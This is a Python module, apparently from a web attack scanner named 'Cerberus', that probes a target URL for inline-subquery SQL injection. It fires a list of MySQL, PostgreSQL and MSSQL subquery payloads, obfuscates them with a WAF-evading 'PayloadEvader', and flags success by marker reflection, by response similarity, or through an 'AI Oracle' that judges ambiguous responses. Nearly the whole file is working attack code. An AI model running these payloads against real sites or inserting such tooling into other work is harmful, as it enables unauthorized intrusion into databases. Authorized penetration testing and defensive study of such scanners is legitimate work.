import logging
import asyncio
import difflib
from typing import Dict, Any, Optional
from backend.core.vector_base import BaseVector
from backend.core.payload_evader import PayloadEvader

logger = logging.getLogger("cerberus_vector_inline")

class VectorInline(BaseVector):
    """
    Motor nativo asíncrono para inyección basada en consultas en línea (Inline Queries / Subqueries).
    Prueba si el motor permite subconsultas dentro de expresiones.
    
    v2.0: Multi-DBMS payloads, baseline differential, AI Oracle fallback.
    """

    async def run(self, context: Dict[str, Any]) -> Dict[str, Any]:
        logger.info(f"[*] Native Engine: Iniciando Vector Inline-based sobre {self.target_url}")
        
        # Instanciar el evasor dinámico
        evader = PayloadEvader(context.get("aggressiveness", 3))
        
        # 1. Baseline para análisis diferencial
        base_resp = await self._safe_get(self.target_url)
        if not base_resp:
            return {"status": "failed", "reason": "baseline_unreachable"}
        
        base_content = base_resp.text
        
        # 2. Payloads de subquery multi-DBMS con marcadores únicos
        MARKER = "CERBERUS_INLINE_X7K9"
        payloads = [
            # MySQL / MariaDB
            evader.evade(f" (SELECT '{MARKER}') "),
            evader.evade(f" AND (SELECT '{MARKER}')='{MARKER}' "),
            evader.evade(f"' AND (SELECT 1 FROM (SELECT '{MARKER}')x)='1"),
            # CHAR-based (evade string signature WAFs)
            evader.evade(f" (SELECT (CHAR(67,69,82,66,69,82,85,83))) "),
            # Arithmetic probe (universal — if subquery works, 1+1=2)
            evader.evade(" AND (SELECT 1+1)=2 "),
            evader.evade(" AND (SELECT COUNT(*) FROM information_schema.tables)>0 "),
            # PostgreSQL
            evader.evade(f" AND (SELECT current_database()) IS NOT NULL "),
            # MSSQL
            evader.evade(f" AND (SELECT DB_NAME()) IS NOT NULL "),
            # Nested subquery (deeper injection proof)
            evader.evade(f" AND 1=(SELECT 1 FROM (SELECT 1)x) "),
        ]

        for payload in payloads:
            test_url = self.inject_url(payload)
            resp = await self._safe_get(test_url)
            
            if not resp:
                continue
            
            # Direct marker detection
            if MARKER in resp.text or "CERBERUS" in resp.text:
                logger.info(f"[+] Inyección Inline-Query Exitosa (Marcador directo) con payload {payload}")
                return {
                    "status": "vulnerable",
                    "technique": "Inline queries (Direct Marker)",
                    "evidence": f"Subquery marker '{MARKER}' reflected in response. Payload: {payload}"
                }
            
            # Differential analysis: if the response is nearly identical to baseline,
            # the subquery was processed without error (valid SQL)
            # Guard: skip differential if HTTP status changed (404 = path not found)
            if resp.status_code != base_resp.status_code:
                continue
            
            ratio = await asyncio.to_thread(
                lambda b=base_content, r=resp.text: difflib.SequenceMatcher(None, b, r).ratio()
            )
            
            # If subquery payload produces same page as baseline (>0.95 match),
            # the DB accepted the subquery syntax — strong indicator
            if resp.status_code == 200 and ratio > 0.95 and "AND" in payload:
                logger.info(f"[+] Inyección Inline-Query Exitosa (Diferencial): ratio={ratio:.3f} con payload {payload}")
                return {
                    "status": "vulnerable",
                    "technique": "Inline queries (Differential)",
                    "evidence": f"Subquery accepted silently by DBMS (ratio={ratio:.3f}). Payload: {payload}"
                }

        # 3. Cortex AI Oracle for Grey Zone
        # If we got mixed signals (some payloads caused changes, some didn't), 
        # ask the AI to analyze the differential
        last_resp = None
        probe_payload = evader.evade(f" AND (SELECT '{MARKER}')='{MARKER}' ")
        probe_url = self.inject_url(probe_payload)
        last_resp = await self._safe_get(probe_url)
        
        if last_resp and base_resp:
            # Guard: skip AI Oracle if HTTP status changed (404 = path not found)
            if last_resp.status_code != base_resp.status_code:
                return {"status": "not_vulnerable"}
            ratio = await asyncio.to_thread(
                lambda: difflib.SequenceMatcher(None, base_content, last_resp.text).ratio()
            )
            if 0.80 < ratio < 0.98:
                logger.info(f"[?] Zona Gris Inline (ratio={ratio:.3f}). Invocando Cortex AI Oracle...")
                try:
                    from backend.core.cortex_ai import analyze_injection_response
                    ai_verdict = await analyze_injection_response(
                        baseline_content=base_content,
                        true_content=last_resp.text,
                        false_content=base_content,  # baseline as "false" since inline is non-conditional
                        vector_type="Inline queries (Subquery)"
                    )
                    
                    logger.info(f"🧠 [Oráculo AI] Veredicto: {ai_verdict['status']}. Confianza: {ai_verdict['confidence']*100}%")
                    
                    if ai_verdict['status'] == 'vulnerable' and ai_verdict['confidence'] > 0.70:
                        return {
                            "status": "vulnerable",
                            "technique": "Inline queries (AI Analyzed)",
                            "evidence": ai_verdict['reasoning']
                        }
                    elif ai_verdict['status'] == 'blocked_by_waf':
                        return {
                            "status": "failed",
                            "reason": "blocked_by_waf",
                            "evidence": ai_verdict['reasoning']
                        }
                except Exception as e:
                    logger.warning(f"AI Oracle failed for inline vector: {e}")

        return {"status": "not_vulnerable"}

    async def _safe_get(self, url: str):
        try:
            return await self.client.get(url, timeout=10.0)
        except Exception as e:
            logger.warning(f"Error HTTP en vector inline: {e}")
            return None
